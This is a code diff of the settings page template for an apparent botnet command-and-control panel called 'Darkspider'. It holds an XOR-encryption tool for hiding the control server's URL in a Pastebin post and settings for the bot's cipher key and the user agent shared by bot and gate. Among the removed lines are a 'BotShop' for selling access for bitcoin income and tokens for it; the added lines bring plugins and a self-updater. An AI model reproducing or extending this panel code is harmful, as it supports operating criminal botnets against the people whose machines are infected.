@@ -1,12 +1,7 @@
+
 {include file="header.tpl"}
 {include file="nav.tpl"}
 
-
-<div class="page-header">
-    <div class="container-fluid">
-        <h2 class="h5 no-margin-bottom">Settings</h2>
-    </div>
-</div>
 
 <!-- Modal -->
 <div class="modal fade" id="createnewUser" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
@@ -52,13 +47,22 @@
             <li class="nav-item">
                 <a class="nav-link" href="#functions" role="tab" data-toggle="tab">Functions</a>
             </li>
-            <li class="nav-item">
-                <a class="nav-link" href="#botshop" role="tab" data-toggle="tab">BotShop</a>
-            </li>
+
             <li class="nav-item">
                 <a class="nav-link" href="#template" role="tab" data-toggle="tab">Template</a>
             </li>
+            <li class="nav-item">
+                <a class="nav-link" href="#plugins" role="tab" data-toggle="tab">Plugins</a>
+            </li>
 
+            {foreach from=$pluginSetting_Tabs item=addTab}
+                <li class="nav-item">
+                    <a class="nav-link" href="#{$addTab.name}" role="tab" data-toggle="tab">{$addTab.name}</a>
+                </li>
+            {/foreach}
+            <!--       <li class="nav-item">
+                        <a class="nav-link" href="#update" role="tab" data-toggle="tab">Update</a>
+                    </li> -->
         </ul>
 
         <!-- Tab panes -->
@@ -108,53 +112,26 @@
                         <input type="text" class="form-control" name="updateinfo" value="{$config.check_update_url}" id="updateinfo" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
                         <small id="updateinfoHelper" class="form-text text-muted">Check New versions from Darkspider.</small>
                     </div>
-                    <div class="form-group">
-                        <label for="enryptionkey">Enryption Key</label>
-                        <input type="text" class="form-control" name="enryptionkey" value="{$config.enryptionkey}" id="enryptionkey" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
-                        <small id="enryptionkeyHelper" class="form-text text-muted">We'll never share your encryption key with anyone else. (This is the XOR Cipher Private Key)</small>
-                    </div>
-                    <div class="form-group">
-                        <label for="useragent">User Agent</label>
-                        <input type="text" class="form-control" name="useragent" value="{$config.useragent}" id="useragent" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
-                        <small id="useragentHelper" class="form-text text-muted">The Bot and the Gate need the same HTTP User Agent.</small>
-                    </div>
-                    <input type="submit" class="btn btn-dark" value="Save">
+                    <!--  <div class="form-group">
+                            <label for="enryptionkey">Enryption Key</label>
+                            <input type="text" class="form-control" name="enryptionkey" value="{$config.enryptionkey}" id="enryptionkey" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
+                            <small id="enryptionkeyHelper" class="form-text text-muted">We'll never share your encryption key with anyone else. (This is the XOR Cipher Private Key)</small>
+                        </div>
+                        <div class="form-group">
+                            <label for="useragent">User Agent</label>
+                            <input type="text" class="form-control" name="useragent" value="{$config.useragent}" id="useragent" aria-describedby="emailHelp" placeholder="Enter your encryption key (From bot config.h)">
+                            <small id="useragentHelper" class="form-text text-muted">The Bot and the Gate need the same HTTP User Agent.</small>
+                        </div> -->
+                    <input type="submit" class="btn btn-primary" value="Save">
                 </form>
             </div>
-
-            <div role="tabpanel" class="tab-pane fade" id="botshop">
-                <form method="POST">
-                    <input type="submit" name="create_new_shop_api" class="btn btn-dark" value="Create new API Access token">
-                </form>
-
-                <div class="shop_api_access">
-                    <ul class="list-group">
-                        {foreach from=$botshopAccessList item=botshopApi}
-                            <li class="list-group-item">
-                                <div class="row">
-                                    <div class="col-md-3">
-                                        <div class="username"> Created By: {$botshopApi.username}  </div>
-                                        <div class="profit"> BTC Income: {$botshopApi.profit}  </div>
-                                    </div>
-                                    <div class="col-md-6">
-                                        <div class="apikey">
-                                            Access Token: {$botshopApi.apikey}
-                                        </div>
-                                    </div>
-                                    <div class="col-md-3">
-                                        <form method="post" id="delete-{$botshopApi.id}">
-                                            <img width="25"  onclick="document.getElementById('delete-{$botshopApi.id}').submit()" src="{$includeDir}assets/img/delete_dark.svg" title="Delete">
-                                            <input name="deleteapi" value="{$botshopApi.id}" hidden>
-                                            <input name="apikey" value="{$botshopApi.apikey}" hidden>
-                                        </form>
-                                    </div>
-                                </div>
-                            </li>
-                        {/foreach}
-                    </ul>
+            <div role="tabpanel" class="tab-pane fade" id="update">
+                <div class="updatecenter">
+                    <a class="bttn version_check" id="1" style="cursor: pointer;">Check for Updates</a>
+                    <div class="loading"></div>
                 </div>
-
             </div>
+
             <div role="tabpanel" class="tab-pane fade" id="template">
                 <form method="post">
                     <div class="form-group">
@@ -178,25 +155,149 @@
                         <div class="alert alert-success" role="alert">
                             Add this to your Pastebin: <b><pre>{$encryptedOUT}</pre></b>
                         </div>
-                        <a  class="btn btn-dark"  href="/settings">Reload</a>
+                        <a  class="btn btn-primary"  href="/settings">Reload</a>
                     {else}
                         <div class="form-group">
                             <label for="encrypt">Encrypt & Decrypt XOR Cipher</label>
                             <input type="text" class="form-control" name="encrypt"  id="encrypt" aria-describedby="emailHelp" placeholder="By Default: http://0.0.0.0/request">
                             <small id="encryptHelper" class="form-text text-muted">Encrypt your current Server URL before create a Pastebin with it. (0.0.0.0 is your IP)</small>
                         </div>
-                        <input type="submit" class="btn btn-dark" value="Encrypt">
+                        <input type="submit" class="btn btn-primary" value="Encrypt">
                     {/if}
                 </form>
             </div>
+            <div role="tabpanel" class="tab-pane fade" id="plugins">
+
+                <table class="table">
+                    <tbody>
+                    {foreach from=$foundPlugins item=plugin}
+                        <tr>
+                            <td>
+                                <form method="POST">
+                                    <input value="{$plugin.name}" name="pluginChanger" hidden>
+                                    {if $plugin.active == "1"}
+                                        <input class="btn btn-primary" type="submit" value="Disable Plugin">
+                                    {else}
+                                        <input  class="btn btn-primary" type="submit" value="Enable Plugin">
+                                    {/if}
+                                </form>
+                            </td>
+                            <td>{$plugin.name}</td>
+                            <td>Plugin Settings</td>
+                        </tr>
+                    {/foreach}
+
+                    </tbody>
+                </table>
+            </div>
+
+            {foreach from=$pluginSetting_Tabs item=addTab}
+                <div role="tabpanel" class="tab-pane fade" id="{$addTab.name}">
+                    {if $addTab.includeDir != ""}
+
+                        {include file=$addTab.includeDir}
+                    {else}
+                        {$addTab.body}
+                    {/if}
+
+                </div>
+            {/foreach}
+
         </div>
 
     </div>
 </div>
+
 {include file="footer.tpl"}
-<script src="{$includeDir}assets/js/front.js"></script>
 
 <script>
+
+
+    // function to reorder
+    $(document).ready(function(){
+        // check users files and update with most recent version
+        $(".version_check").on('click',function(e) {
+            //$(".loading").show();
+            var uid = $(this).attr("id");
+            var info = "uid="+uid+"&vcheck=1";
+            $.ajax({
+                beforeSend: function(){
+                    $(".loading").html('<br><img src="loader.gif" width="16" height="16" />');
+                },
+                type: "POST",
+                url: "version_check",
+                data: info,
+                dataType: "json",
+                success: function(data){
+                    // clear loading information
+                    $(".loading").html("");
+                    // check for version verification
+                    if(data.version != 0){
+                        $(".version_check").remove();
+                        $(".loading").html("<p><b>"+data.version+"</b> Version is Released. You are outdated</p>  <a id='1' class='bttn doUpdate'>START UPDATE</a>");
+
+
+                        $(".doUpdate").on('click',function(e) {
+                            //$(".loading").show();
+                            var uid = $(this).attr("id");
+                            var info = "uid="+uid+"&vcheck=1";
+                            // clear loading information
+                            $(".loading").html("");
+                            // check for version verification
+                            if(data.version != 0){
+                                var uInfo = "uid="+uid+"&vnum="+data.version
+                                $.ajax({
+                                    beforeSend: function(){
+                                        $(".loading").html('<br><img src="loader.gif" width="16" height="16" />');
+                                    },
+                                    type: "POST",
+                                    url: "doUpdate",
+                                    data: uInfo,
+                                    dataType: "json",
+                                    success: function(data){
+                                        // check for version verification
+                                        if(data.copy != 0){
+                                            if(data.unzip == 1){
+                                                // clear loading information
+                                                $(".version_check").html("");
+                                                // successful update
+                                                $(".loading").html("Successful Update!");
+                                            }else{
+                                                // error during update/unzip
+                                                $(".loading").html("<br>Sorry, there was an error with the update.");
+                                            }
+                                        }
+                                    },
+                                    error: function() {
+                                        // error
+                                        $(".loading").html('<br>There was an error updating your files.');
+                                    }
+                                });
+                            }
+                        });
+
+
+                    }else{
+                        // user has the latest version already installed
+                        $(".version_check").remove();
+                        $(".loading").html("You already have the latest version.");
+                    }
+                },
+                error: function() {
+                    // error
+                    $(".loading").html('<br>There was an error checking your latest version.');
+                }
+            });
+        });
+
+
+        // check users files and update with most recent version
+
+    });
+
+
+
+
 
 
 
@@ -215,6 +316,3 @@
         $('.nav-tabs a[href="' + activeTab + '"]').tab('show');
     }
 </script>
-
-
-
